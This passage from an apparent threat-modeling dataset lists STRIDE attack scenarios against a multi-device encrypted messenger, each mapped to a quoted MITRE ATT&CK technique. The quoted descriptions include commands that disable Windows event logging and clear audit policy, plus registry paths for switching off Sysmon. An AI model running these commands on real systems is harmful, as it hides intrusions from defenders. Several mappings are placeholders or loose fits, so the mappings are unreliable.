                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database to modify stored authentication credentials and pre-keys.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability in SQLite database is present and exploitable.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of vulnerability"
                },
                {
                    "Assumption": "Database is not adequately protected against tampering.",
                    "Role": "Developer",
                    "Condition": "Insufficient database security measures"
                },
                {
                    "Assumption": "Attackers have access to the local storage of the application.",
                    "Role": "Attacker",
                    "Condition": "Access to device storage"
                }
            ],
            "Potential Impact": "Alteration of authentication credentials, potential unauthorized access, and compromise of encryption mechanisms.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Database Exploitation",
                "Credential Manipulation",
                "Local Storage Access"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the companion device and modifies the identity keys to intercept and alter messages.",
            "Assumptions": [
                {
                    "Assumption": "Companion device is less secure than the primary device.",
                    "Role": "User",
                    "Condition": "Weaker security practices"
                },
                {
                    "Assumption": "Attackers can access and modify identity key storage on the companion device.",
                    "Role": "Attacker",
                    "Condition": "Successful device access"
                },
                {
                    "Assumption": "Users do not monitor identity key integrity across devices.",
                    "Role": "User",
                    "Condition": "Negligent monitoring practices"
                }
            ],
            "Potential Impact": "Compromise of communication integrity, unauthorized message alteration, and potential disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Device Access",
                "Message Interception",
                "Key Manipulation"
            ],
            "mitre_technique": {
                "name": "Device Registration",
                "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
                "id": "attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215",
                "technique_id": "T1098.005"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the mobile application to alter the encryption algorithms used, weakening message security.",
            "Assumptions": [
                {
                    "Assumption": "Mobile application has a vulnerability allowing code injection.",
                    "Role": "Developer",
                    "Condition": "Presence of code vulnerabilities"
                },
                {
                    "Assumption": "Attackers can bypass security to inject code into the application.",
                    "Role": "Attacker",
                    "Condition": "Successful security bypass"
                },
                {
                    "Assumption": "Users download and use the compromised application.",
                    "Role": "User",
                    "Condition": "Lack of application verification"
                }
            ],
            "Potential Impact": "Weakening of encryption, unauthorized access to message content, potential disclosure of confidential communications.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Code Injection",
                "Encryption Weakening",
                "Mobile Application"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker sends messages impersonating another user, later claiming they did not send the messages due to lack of proper logging and non-repudiation measures.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper non-repudiation measures.",
                    "Role": "Developer",
                    "Condition": "No message logging or tracking"
                },
                {
                    "Assumption": "Attackers have the capability to send messages from another user's account.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of system architecture"
                },
                {
                    "Assumption": "Users cannot verify the origin of messages effectively.",
                    "Role": "User",
                    "Condition": "Reliance on system integrity"
                }
            ],
            "Potential Impact": "Loss of message authenticity, disputes over message origin, and potential legal and reputational consequences.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Message Spoofing",
                "Impersonation",
                "Lack of Logging"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies sending harmful messages, exploiting the lack of message tracking and accountability in the system.",
            "Assumptions": [
                {
                    "Assumption": "System lacks accountability and tracking mechanisms for sent messages.",
                    "Role": "Developer",
                    "Condition": "No comprehensive message tracking"
                },
                {
                    "Assumption": "Malicious users exploit known loopholes in the system.",
                    "Role": "User",
                    "Condition": "Knowledge of system weaknesses"
                },
                {
                    "Assumption": "Users trust the system's integrity without additional verification.",
                    "Role": "User",
                    "Condition": "Reliance on system integrity"
                }
            ],
            "Potential Impact": "Disputes over message origination, difficulty in assigning responsibility, and potential for misuse.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Non-Repudiation Exploitation",
                "Accountability",
                "Message Tracking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies participating in group communications due to inadequate logging of group event participation.",
            "Assumptions": [
                {
                    "Assumption": "Group event participation is not adequately logged.",
                    "Role": "Developer",
                    "Condition": "Lack of group event tracking"
                },
                {
                    "Assumption": "Users can participate anonymously without accountability.",
                    "Role": "User",
                    "Condition": "Design of group communication"
                },
                {
                    "Assumption": "System does not track or log user interactions effectively.",
                    "Role": "Developer",
                    "Condition": "Inadequate system logging"
                }
            ],
            "Potential Impact": "Uncertain participation records, disputes over group communication content, and potential misuse of the platform.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Group Communication",
                "Event Logging",
                "Participation Tracking"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol to decrypt and access sensitive messages.",
            "Assumptions": [
                {
                    "Assumption": "Encryption protocol has a known vulnerability.",
                    "Role": "Developer",
                    "Condition": "Presence of exploitable flaws"
                },
                {
                    "Assumption": "Attackers can insert themselves into the communication stream.",
                    "Role": "Attacker",
                    "Condition": "Access to network path"
                },
                {
                    "Assumption": "Users rely exclusively on encryption for confidentiality.",
                    "Role": "User",
                    "Condition": "Trust in encryption"
                }
            ],
            "Potential Impact": "Disclosure of sensitive user communications and potential leakage of confidential data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Encryption Exploitation",
                "Message Decryption",
                "Vulnerability Exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the backup storage of messages, exploiting weak access controls to retrieve copy of sensitive conversations.",
            "Assumptions": [
                {
                    "Assumption": "Backup storage is inadequately protected.",
                    "Role": "Developer",
                    "Condition": "Weak access control measures"
                },
                {
                    "Assumption": "Attackers can gain access to backup storage systems.",
                    "Role": "Attacker",
                    "Condition": "Access to storage environment"
                },
                {
                    "Assumption": "Users trust the backup mechanisms without additional safeguards.",
                    "Role": "User",
                    "Condition": "Reliance on system security"
                }
            ],
            "Potential Impact": "Disclosure of archived user communications, compromise of historical conversation data, and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Backup Exploitation",
                "Access Control Weakness",
                "Data Retrieval"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An adversary with access to companion devices siphons off authentication credentials and pre-keys stored on the device, leading to unauthorized message interception.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices store sensitive authentication data.",
                    "Role": "Developer",
                    "Condition": "Device design includes local storage"
                },
                {
                    "Assumption": "Attackers can access and extract data from companion devices.",
                    "Role": "Attacker",
                    "Condition": "Physical or logical device access"
                },
                {
                    "Assumption": "Users assume companion device security is equivalent to primary device security.",
                    "Role": "User",
                    "Condition": "Trust in device security"
                }
            ],
            "Potential Impact": "Interception and unauthorized disclosure of communications, potential leakage of identity keys.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Device Access",
                "Credential Theft",
                "Message Interception"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the application with excessive requests, overwhelming the server and preventing legitimate user access.",
            "Assumptions": [
                {
                    "Assumption": "Application architecture does not have adequate defenses against flooding.",
                    "Role": "Developer",
                    "Condition": "Insufficient DDOS protection"
                },
                {
                    "Assumption": "Attackers can generate overwhelming levels of traffic.",
                    "Role": "Attacker",
                    "Condition": "Resource availability"
                },
                {
                    "Assumption": "Users require reliable access and are affected by service outages.",
                    "Role": "User",
                    "Condition": "Reliance on application availability"
                }
            ],
            "Potential Impact": "Disruption of service availability, preventing users from communicating and accessing the messaging platform.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Flooding",
                "Server Overload",
                "Traffic Generation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the encryption algorithms to trigger excessive computational operations, degrading application performance.",
            "Assumptions": [
                {
                    "Assumption": "Encryption algorithms are susceptible to computational overload.",
                    "Role": "Developer",
                    "Condition": "Complex encryption schemes"
                },
                {
                    "Assumption": "Attackers can influence encryption-related operations.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of encryption processes"
                },
                {
                    "Assumption": "Users rely on consistent application performance for communication.",
                    "Role": "User",
                    "Condition": "Expectations of performance"
                }
            ],
            "Potential Impact": "Degradation of application performance, potential service outages, and disruption of user communication.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Computational Overload",
                "Algorithm Exploitation",
                "Performance Degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the companion devices, causing synchronization failures with the primary device, leading to communication breaks.",
            "Assumptions": [
                {
                    "Assumption": "Synchronization mechanisms are not resilient to attacks.",
                    "Role": "Developer",
                    "Condition": "Weak synchronization processes"
                },
                {
                    "Assumption": "Attackers can disrupt communication between devices.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Users depend on seamless multi-device synchronization.",
                    "Role": "User",
                    "Condition": "Reliance on device interconnectivity"
                }
            ],
            "Potential Impact": "Disruption of multi-device communication, potential loss of access to message history, and user frustration.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Synchronization Failure",
                "Multi-Device",
                "Communication Disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the messaging application to gain administrative access to user accounts.",
            "Assumptions": [
                {
                    "Assumption": "Application has a privilege escalation vulnerability.",
                    "Role": "Developer",
                    "Condition": "Known or unknown software flaws"
                },
                {
                    "Assumption": "Attackers can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency"
                },
                {
                    "Assumption": "Users operate under the assumption of secure privilege management.",
                    "Role": "User",
                    "Condition": "Trust in application security"
                }
            ],
            "Potential Impact": "Unauthorized access to administrative features, potential for wide-ranging data breaches, and loss of user trust.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Administrative Access",
                "Privilege Escalation",
                "Software Vulnerability"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains access to a companion device and escalates privileges to control linked primary devices and other companions.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices have weaker security controls.",
                    "Role": "User",
                    "Condition": "Less stringent security on secondary devices"
                },
                {
                    "Assumption": "Attackers have access to companion devices.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access"
                },
                {
                    "Assumption": "Users link multiple devices without considering security implications.",
                    "Role": "User",
                    "Condition": "Reliance on multi-device functionality"
                }
            ],
            "Potential Impact": "Compromise of multiple devices, potential unauthorized control over user accounts, and extensive data breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Device Exploitation",
                "Multi-Device Control",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the authentication process to gain higher-level access than intended, compromising secure communications.",
            "Assumptions": [
                {
                    "Assumption": "Authentication process has exploitable flaws.",
                    "Role": "Developer",
                    "Condition": "Design or implementation errors"
                },
                {
                    "Assumption": "Attackers can exploit authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Technical knowledge"
                },
                {
                    "Assumption": "Users trust the robustness of the authentication process.",
                    "Role": "User",
                    "Condition": "Assumption of secure authentication"
                }
            ],
            "Potential Impact": "Unauthorized elevation of privilege, potential breach of secure communications, and compromise of user data.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Authentication Exploitation",
                "Secure Communication",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake companion desktop client to deceive users into linking it to their primary device, thereby gaining unauthorized access to the user\u2019s messages.",
            "Assumptions": [
                {
                    "Assumption": "Users may not verify the authenticity of their companion devices.",
                    "Role": "User",
                    "Condition": "Users are unaware of the need to verify device authenticity."
                },
                {
                    "Assumption": "Attackers can distribute and promote fake desktop clients.",
                    "Role": "Attacker",
                    "Condition": "Adequate dissemination channels are available to attackers."
                },
                {
                    "Assumption": "The primary device can be tricked into linking with the fake client.",
                    "Role": "System",
                    "Condition": "The linking process lacks sufficient verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communications and data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fake client",
                "unauthorized access",
                "user deception"
            ],
            "mitre_technique": {
                "name": "User Execution",
